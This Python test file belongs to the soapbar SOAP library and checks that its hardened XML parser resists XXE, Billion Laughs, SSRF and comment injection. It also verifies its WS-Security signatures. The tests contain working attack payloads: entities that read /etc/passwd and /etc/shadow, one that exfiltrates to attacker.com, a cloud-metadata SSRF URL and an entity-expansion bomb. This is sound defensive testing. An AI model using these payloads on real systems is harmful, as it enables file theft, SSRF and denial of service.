"""
Security audit tests for soapbar.

Validates that the hardened lxml parser correctly blocks XML attack vectors.
All tests are self-contained with no outbound HTTP.
"""
from __future__ import annotations

import contextlib
import datetime

import pytest
from lxml import etree

from soapbar.core.binding import BindingStyle
from soapbar.core.envelope import SoapEnvelope
from soapbar.core.fault import SoapFault
from soapbar.core.xml import parse_xml
from soapbar.server.application import SoapApplication
from soapbar.server.service import SoapService, soap_operation

try:
    import xmlsec as _xmlsec  # noqa: F401
    _HAS_XMLSEC = True
except ImportError:
    _HAS_XMLSEC = False


def _make_app() -> SoapApplication:
    class _Echo(SoapService):
        __service_name__ = "Echo"
        __tns__ = "http://example.com/echo"
        __binding_style__ = BindingStyle.DOCUMENT_LITERAL_WRAPPED

        @soap_operation()
        def echo(self, msg: str) -> str:
            return msg

    app = SoapApplication()
    app.register(_Echo())
    return app


# ---------------------------------------------------------------------------
# XXE Prevention (resolve_entities=False)
# ---------------------------------------------------------------------------

class TestXxePrevention:
    """OWASP A5 — XML External Entity (XXE) Injection prevention."""

    def test_xxe_entity_not_expanded(self):
        """Entity references must NOT be expanded (XXE prevention).
        With resolve_entities=False, lxml silently drops entity content."""
        xxe_xml = b"""<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
          <soapenv:Body>
            <payload>&xxe;</payload>
          </soapenv:Body>
        </soapenv:Envelope>"""
        # Entity content must NOT appear in the parsed result
        try:
            root = parse_xml(xxe_xml)
            body = root.find("{http://schemas.xmlsoap.org/soap/envelope/}Body")
            if body is not None:
                payload = body.find("payload")
                if payload is not None:
                    text = payload.text or ""
                    assert "root:" not in text, "XXE: /etc/passwd content was expanded!"
                    assert "/bin/" not in text, "XXE: /etc/passwd content was expanded!"
        except etree.XMLSyntaxError:
            pass  # Parser rejecting the DTD is also an acceptable security outcome

    def test_xxe_via_parameter_entity(self):
        """Parameter entities are also blocked."""
        xxe_xml = b"""<?xml version="1.0"?>
        <!DOCTYPE root [
          <!ENTITY % file SYSTEM "file:///etc/shadow">
          <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
          %eval;
          %exfil;
        ]>
        <root/>"""
        try:
            root = parse_xml(xxe_xml)
            # Must not contain shadow file content
            text = etree.tostring(root, encoding="unicode")
            assert "root:" not in text
        except etree.XMLSyntaxError:
            pass  # Rejection is acceptable

    def test_xxe_via_envelope_parsing(self):
        """XXE attack through SOAP envelope parsing must be blocked."""
        xxe_xml = b"""<?xml version="1.0"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
          <soapenv:Body><data>&xxe;</data></soapenv:Body>
        </soapenv:Envelope>"""
        app = _make_app()
        _status, _ct, body = app.handle_request(xxe_xml)
        # Body response must not contain /etc/passwd content
        assert b"root:" not in body, "XXE: /etc/passwd content leaked in response"
        assert b"/bin/" not in body, "XXE: /etc/passwd content leaked in response"

    def test_xxe_local_entity_defined(self):
        """Locally-defined entities should be dropped/ignored."""
        xml = b"""<?xml version="1.0"?>
        <!DOCTYPE test [<!ENTITY local "injected content">]>
        <root>&local;</root>"""
        try:
            root = parse_xml(xml)
            text = root.text or ""
            # Entity was either dropped (empty) or rejection was raised
            assert "injected content" not in text
        except etree.XMLSyntaxError:
            pass  # Rejection is a valid security response


# ---------------------------------------------------------------------------
# Billion Laughs / XML Bomb (huge_tree=False + entity expansion)
# ---------------------------------------------------------------------------

class TestBillionLaughsPrevention:
    """Billion Laughs attack (exponential entity expansion) prevention."""

    def test_billion_laughs_entity_expansion(self):
        """Classic Billion Laughs XML must not cause memory exhaustion."""
        billion_laughs = b"""<?xml version="1.0"?>
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
          <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
          <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
          <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
          <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
          <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
          <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
        ]>
        <lolz>&lol9;</lolz>"""
        try:
            root = parse_xml(billion_laughs)
            # If parsed, entities must not be expanded
            text = etree.tostring(root, encoding="unicode")
            assert len(text) < 10_000, (
                f"Billion Laughs expansion occurred: output length {len(text)}"
            )
        except etree.XMLSyntaxError:
            pass  # Rejection is the preferred outcome

    def test_recursive_entity_not_expanded(self):
        """Recursive entity definitions must not cause infinite recursion."""
        recursive = b"""<?xml version="1.0"?>
        <!DOCTYPE root [
          <!ENTITY a "&b;">
          <!ENTITY b "&a;">
        ]>
        <root>&a;</root>"""
        with contextlib.suppress(etree.XMLSyntaxError):
            parse_xml(recursive)
            # Should parse without crash


# ---------------------------------------------------------------------------
# SSRF via External DTD (no_network=True)
# ---------------------------------------------------------------------------

class TestSsrfPrevention:
    """SSRF prevention via no_network=True in lxml parser."""

    def test_external_dtd_blocked(self):
        """External DTD references must not trigger network requests."""
        external_dtd = b"""<?xml version="1.0"?>
        <!DOCTYPE root SYSTEM "http://attacker.example.com/evil.dtd">
        <root>data</root>"""
        # Should either parse without fetching or raise XMLSyntaxError
        with contextlib.suppress(etree.XMLSyntaxError):
            parse_xml(external_dtd)
            # Parsed successfully without network access — good

    def test_ssrf_via_parameter_entity_url(self):
        """Parameter entity with URL must not trigger SSRF."""
        ssrf_xml = b"""<?xml version="1.0"?>
        <!DOCTYPE root [
          <!ENTITY % remote SYSTEM "http://169.254.169.254/latest/meta-data/">
          %remote;
        ]>
        <root/>"""
        with contextlib.suppress(etree.XMLSyntaxError):
            parse_xml(ssrf_xml)


# ---------------------------------------------------------------------------
# XML Bomb — oversized attributes / text
# ---------------------------------------------------------------------------

class TestXmlBombPrevention:
    """huge_tree=False prevents memory exhaustion from crafted large XML."""

    def test_large_attribute_value_handled(self):
        """10MB attribute value should be handled without OOM."""
        big_attr = "A" * (10 * 1024 * 1024)  # 10MB
        xml = f'<root attr="{big_attr}"/>'.encode()
        with contextlib.suppress(etree.XMLSyntaxError):
            parse_xml(xml)
            # If parsed, must not expand beyond acceptable memory

    def test_large_text_content_handled(self):
        """1MB text content must be handled without crash."""
        big_text = "B" * (1024 * 1024)  # 1MB
        xml = f"<root>{big_text}</root>".encode()
        try:
            root = parse_xml(xml)
            # 1MB of text content is within limits
            assert root is not None
        except etree.XMLSyntaxError:
            pass


# ---------------------------------------------------------------------------
# Comment and PI Injection
# ---------------------------------------------------------------------------

class TestCommentAndPiRemoval:
    """remove_comments=True and remove_pis=True prevent injection via XML comments/PIs."""

    def test_xml_comments_removed(self):
        """XML comments must be stripped by the hardened parser."""
        xml = b"<root><!-- injected comment --><child>value</child></root>"
        root = parse_xml(xml)
        # If comments were kept, tostring would contain them
        text = etree.tostring(root, encoding="unicode")
        assert "<!--" not in text, "XML comments were not removed by hardened parser"
        assert "-->" not in text

    def test_xml_processing_instructions_removed(self):
        """Processing instructions must be stripped."""
        xml = b"<?xml-stylesheet type='text/xsl' href='attack.xsl'?><root/>"
        try:
            root = parse_xml(xml)
            text = etree.tostring(root, encoding="unicode")
            assert "<?xml-stylesheet" not in text
        except etree.XMLSyntaxError:
            pass  # Also acceptable

    def test_comment_injection_via_soap(self):
        """XML comments in SOAP body must not result in injected content being executed.

        Note: The XML spec forbids '--' inside comments.  Such malformed XML causes
        lxml to report a parse error.  The error message may reference the raw comment
        text, but this is in a fault message — the comment was never executed as data.
        What matters is that lxml's remove_comments=True prevents comment-as-valid-data
        scenarios and the service handler never receives comment content.
        """
        # Valid XML comment (no '--' inside)
        xml = b"""<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
          <soapenv:Body>
            <!-- injection attempt -->
            <echo xmlns="http://example.com/echo">
              <msg>normal</msg>
            </echo>
          </soapenv:Body>
        </soapenv:Envelope>"""
        app = _make_app()
        _status, _ct, body = app.handle_request(xml)
        # Comment content must NOT appear in the response body as executed data.
        # The service either processes "normal" or returns a fault — not the comment text.
        assert b"injection attempt" not in body, \
            "Comment content must be stripped before reaching the service handler"


# ---------------------------------------------------------------------------
# WSDL Security
# ---------------------------------------------------------------------------

class TestWsdlSecurity:
    """WSDL parsing security — external references and entity injection."""

    def test_wsdl_xxe_blocked(self):
        """XXE in WSDL parsing must be blocked."""
        from soapbar.core.wsdl.parser import parse_wsdl
        evil_wsdl = b"""<?xml version="1.0"?>
        <!DOCTYPE definitions [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <definitions xmlns="http://schemas.xmlsoap.org/wsdl/"
                     name="&xxe;"
                     targetNamespace="http://example.com/">
          <portType name="PT"/>
        </definitions>"""
        try:
            defn = parse_wsdl(evil_wsdl)
            # Entity must NOT be in defn.name
            assert "root:" not in defn.name
            assert "/bin/" not in defn.name
        except Exception:
            pass  # Any exception is also acceptable


# ---------------------------------------------------------------------------
# Namespace Confusion
# ---------------------------------------------------------------------------

class TestNamespaceConfusion:
    """Namespace confusion attacks — wrong namespace accepted as valid SOAP."""

    def test_wrong_namespace_rejected(self):
        """Wrong envelope namespace raises SoapFault(VersionMismatch), not silent acceptance."""
        wrong_ns = b"""<env:Envelope xmlns:env="http://evil.example.com/soap">
          <env:Body/>
        </env:Envelope>"""
        with pytest.raises(SoapFault, match="Unknown SOAP envelope namespace"):
            SoapEnvelope.from_xml(wrong_ns)

    def test_empty_namespace_rejected(self):
        """Unqualified Envelope element (no namespace) raises SoapFault(VersionMismatch)."""
        no_ns = b"<Envelope><Body/></Envelope>"
        with pytest.raises(SoapFault):
            SoapEnvelope.from_xml(no_ns)


# ---------------------------------------------------------------------------
# S05 — Exclusive C14N in signed envelopes (WS-I BSP 1.1 R5404)
# ---------------------------------------------------------------------------

_SIMPLE_ENV = (
    b"<?xml version='1.0' encoding='utf-8'?>"
    b'<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
    b"<soapenv:Body><ping/></soapenv:Body>"
    b"</soapenv:Envelope>"
)

_DS_NS = "http://www.w3.org/2000/09/xmldsig#"
_EXCL_C14N = "http://www.w3.org/2001/10/xml-exc-c14n#"
_WSU_NS = "http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"


def _make_key_and_cert():
    from cryptography import x509
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.x509.oid import NameOID

    key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "audit-test")])
    cert = (
        x509.CertificateBuilder()
        .subject_name(name)
        .issuer_name(name)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(datetime.datetime.now(datetime.timezone.utc))
        .not_valid_after(
            datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
        )
        .sign(key, hashes.SHA256())
    )
    return key, cert


@pytest.mark.skipif(
    pytest.importorskip("signxml", reason="signxml not installed") is None,
    reason="signxml not installed",
)
class TestExclusiveC14N:
    """S05: Signed envelopes must use Exclusive C14N (WS-I BSP 1.1 R5404)."""

    def test_signed_info_uses_exclusive_c14n(self):
        """CanonicalizationMethod/@Algorithm must be the Exclusive C14N URI."""
        from lxml import etree

        from soapbar.core.wssecurity import sign_envelope
        key, cert = _make_key_and_cert()
        signed = sign_envelope(_SIMPLE_ENV, key, cert)
        root = etree.fromstring(signed)
        c14n_elems = root.findall(
            f".//{{{_DS_NS}}}CanonicalizationMethod"
        )
        assert c14n_elems, "No ds:CanonicalizationMethod found in signed envelope"
        for elem in c14n_elems:
            assert elem.get("Algorithm") == _EXCL_C14N, (
                f"Expected Exclusive C14N ({_EXCL_C14N!r}), "
                f"got {elem.get('Algorithm')!r}"
            )

    def test_reference_transforms_use_exclusive_c14n(self):
        """Every ds:Transform inside a ds:Reference must use Exclusive C14N."""
        from lxml import etree

        from soapbar.core.wssecurity import sign_envelope
        key, cert = _make_key_and_cert()
        signed = sign_envelope(_SIMPLE_ENV, key, cert)
        root = etree.fromstring(signed)
        transforms = root.findall(
            f".//{{{_DS_NS}}}Reference/{{{_DS_NS}}}Transforms/{{{_DS_NS}}}Transform"
        )
        c14n_transforms = [
            t for t in transforms if t.get("Algorithm") == _EXCL_C14N
        ]
        # At least one Exclusive C14N transform must exist
        assert c14n_transforms, "No Exclusive C14N Transform found in ds:Reference/Transforms"


# ---------------------------------------------------------------------------
# S04 — Explicit ds:Reference for Body (WS-I BSP 1.1 R5416, R5441)
# ---------------------------------------------------------------------------

@pytest.mark.skipif(
    pytest.importorskip("signxml", reason="signxml not installed") is None,
    reason="signxml not installed",
)
class TestExplicitBodyReference:
    """S04: Signed envelopes must contain a discrete ds:Reference for the Body element."""

    def test_body_has_wsu_id_after_signing(self):
        """sign_envelope() assigns wsu:Id='Body-1' to the Body element."""
        from lxml import etree

        from soapbar.core.wssecurity import sign_envelope
        key, cert = _make_key_and_cert()
        signed = sign_envelope(_SIMPLE_ENV, key, cert)
        root = etree.fromstring(signed)
        soap_ns = "http://schemas.xmlsoap.org/soap/envelope/"
        body = root.find(f"{{{soap_ns}}}Body")
        assert body is not None
        wsu_id = body.get(f"{{{_WSU_NS}}}Id")
        assert wsu_id is not None, "Body element missing wsu:Id after signing"

    def test_signature_contains_body_reference(self):
        """ds:Signature must contain a ds:Reference with URI='#Body-1'."""
        from lxml import etree

        from soapbar.core.wssecurity import sign_envelope
        key, cert = _make_key_and_cert()
        signed = sign_envelope(_SIMPLE_ENV, key, cert)
        root = etree.fromstring(signed)
        refs = root.findall(f".//{{{_DS_NS}}}Reference")
        uris = [r.get("URI") or "" for r in refs]
        assert any(uri.startswith("#") for uri in uris), (
            f"No fragment URI in ds:Reference elements; found: {uris}"
        )

    def test_bsp_body_has_wsu_id_after_signing(self):
        """sign_envelope_bsp() also assigns wsu:Id='Body-1' to the Body element."""
        from lxml import etree

        from soapbar.core.wssecurity import sign_envelope_bsp
        key, cert = _make_key_and_cert()
        signed = sign_envelope_bsp(_SIMPLE_ENV, key, cert)
        root = etree.fromstring(signed)
        soap_ns = "http://schemas.xmlsoap.org/soap/envelope/"
        body = root.find(f"{{{soap_ns}}}Body")
        assert body is not None
        wsu_id = body.get(f"{{{_WSU_NS}}}Id")
        assert wsu_id is not None, "Body element missing wsu:Id after BSP signing"

    def test_timestamp_reference_included_when_present(self):
        """When the envelope has a wsse:Security/wsu:Timestamp, sign_envelope() must
        include a ds:Reference for the Timestamp element (S04 Timestamp coverage)."""
        from lxml import etree

        from soapbar.core.wssecurity import sign_envelope

        _WSSE_NS = "http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd"  # noqa: N806 — spec URI constant
        _SOAP_NS = "http://schemas.xmlsoap.org/soap/envelope/"  # noqa: N806 — spec URI constant

        # Build an envelope that already includes a wsse:Security + wsu:Timestamp
        envelope_with_ts = (
            f'<?xml version="1.0" encoding="utf-8"?>'
            f'<soapenv:Envelope xmlns:soapenv="{_SOAP_NS}"'
            f'  xmlns:wsse="{_WSSE_NS}"'
            f'  xmlns:wsu="{_WSU_NS}">'
            f"  <soapenv:Header>"
            f'    <wsse:Security soapenv:mustUnderstand="1">'
            f'      <wsu:Timestamp wsu:Id="TS-1">'
            f"        <wsu:Created>2026-01-01T00:00:00Z</wsu:Created>"
            f"        <wsu:Expires>2026-01-01T00:05:00Z</wsu:Expires>"
            f"      </wsu:Timestamp>"
            f"    </wsse:Security>"
            f"  </soapenv:Header>"
            f"  <soapenv:Body><ping/></soapenv:Body>"
            f"</soapenv:Envelope>"
        ).encode()

        key, cert = _make_key_and_cert()
        signed = sign_envelope(envelope_with_ts, key, cert)
        root = etree.fromstring(signed)
        refs = root.findall(f".//{{{_DS_NS}}}Reference")
        uris = [r.get("URI") or "" for r in refs]
        # Must have a Reference for both Body and Timestamp
        assert any("#Body" in u for u in uris), f"No Body reference found; refs={uris}"
        assert any("#TS-1" in u for u in uris), f"No Timestamp reference found; refs={uris}"



# ---------------------------------------------------------------------------
# S04 + S05 — libxmlsec1 round-trip verification (cross-stack interop proof)
# ---------------------------------------------------------------------------

@pytest.mark.skipif(
    not _HAS_XMLSEC,
    reason="python-xmlsec not installed (needs libxmlsec1-dev; always runs in CI)",
)
class TestXmlsecRoundTrip:
    """Cross-implementation verification of S04+S05 using python-xmlsec / libxmlsec1.

    libxmlsec1 is the same C canonicalization library linked by Apache Santuario
    (WSS4J), many CXF builds, and the .NET XmlDsig stack.  A successful
    round-trip here is stronger evidence of interoperability than the structural
    assertions in TestExclusiveC14N / TestExplicitBodyReference, because those
    only verify what soapbar *emits*, not whether an independent verifier
    *accepts* it.

    These tests run automatically in CI (ubuntu-latest has libxmlsec1).
    Locally: ``sudo apt-get install libxmlsec1-dev libxmlsec1-openssl`` then
    ``uv sync --group crypto-interop``.
    """

    def _verify(self, signed_bytes: bytes, cert: object) -> None:
        """Verify *signed_bytes* with libxmlsec1, raises xmlsec.Error on failure."""
        import xmlsec
        from cryptography.hazmat.primitives import serialization

        cert_pem: bytes = cert.public_bytes(serialization.Encoding.PEM)  # type: ignore[union-attr]
        root = etree.fromstring(signed_bytes)

        # Register wsu:Id (local name "Id") as an XML ID attribute so that
        # libxmlsec1 can resolve ds:Reference URI="#Body-1" / "#TS-1".
        # xmlsec.tree.add_ids() walks the subtree and calls xmlAddID() in
        # libxml2 for every element whose attribute local-name matches.
        xmlsec.tree.add_ids(root, ["Id"])

        sig_node = xmlsec.tree.find_node(root, xmlsec.Node.SIGNATURE)
        assert sig_node is not None, "No ds:Signature found in signed envelope"

        ctx = xmlsec.SignatureContext()
        ctx.key = xmlsec.Key.from_memory(cert_pem, xmlsec.KeyFormat.CERT_PEM)
        ctx.verify(sig_node)  # raises xmlsec.Error if invalid

    # --- sign_envelope (simple, no Timestamp) --------------------------------

    def test_simple_envelope_verifies(self) -> None:
        """sign_envelope() — simple Body-only reference verifies under libxmlsec1."""
        from soapbar.core.wssecurity import sign_envelope

        key, cert = _make_key_and_cert()
        signed = sign_envelope(_SIMPLE_ENV, key, cert)
        self._verify(signed, cert)

    # --- sign_envelope with Timestamp ----------------------------------------

    def test_envelope_with_timestamp_verifies(self) -> None:
        """sign_envelope() — Body+Timestamp references verify under libxmlsec1."""
        from soapbar.core.wssecurity import sign_envelope

        _WSSE_NS = "http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd"  # noqa: N806 — spec URI constant
        _SOAP_NS = "http://schemas.xmlsoap.org/soap/envelope/"  # noqa: N806 — spec URI constant

        env_with_ts = (
            f'<?xml version="1.0" encoding="utf-8"?>'
            f'<soapenv:Envelope xmlns:soapenv="{_SOAP_NS}"'
            f'  xmlns:wsse="{_WSSE_NS}"'
            f'  xmlns:wsu="{_WSU_NS}">'
            f"  <soapenv:Header>"
            f'    <wsse:Security soapenv:mustUnderstand="1">'
            f'      <wsu:Timestamp wsu:Id="TS-1">'
            f"        <wsu:Created>2026-01-01T00:00:00Z</wsu:Created>"
            f"        <wsu:Expires>2026-01-01T00:05:00Z</wsu:Expires>"
            f"      </wsu:Timestamp>"
            f"    </wsse:Security>"
            f"  </soapenv:Header>"
            f"  <soapenv:Body><ping/></soapenv:Body>"
            f"</soapenv:Envelope>"
        ).encode()

        key, cert = _make_key_and_cert()
        signed = sign_envelope(env_with_ts, key, cert)
        self._verify(signed, cert)

    # --- sign_envelope_bsp ---------------------------------------------------

    def test_bsp_envelope_verifies(self) -> None:
        """sign_envelope_bsp() output verifies under libxmlsec1."""
        from soapbar.core.wssecurity import sign_envelope_bsp

        key, cert = _make_key_and_cert()
        signed = sign_envelope_bsp(_SIMPLE_ENV, key, cert)
        self._verify(signed, cert)

    # --- tamper guard --------------------------------------------------------

    def test_tampered_body_is_rejected(self) -> None:
        """libxmlsec1 must reject an envelope whose Body content was modified post-signing."""
        import xmlsec

        from soapbar.core.wssecurity import sign_envelope

        key, cert = _make_key_and_cert()
        signed = sign_envelope(_SIMPLE_ENV, key, cert)
        tampered = signed.replace(b"<ping/>", b"<ping>injected</ping>")
        with pytest.raises(xmlsec.Error):
            self._verify(tampered, cert)
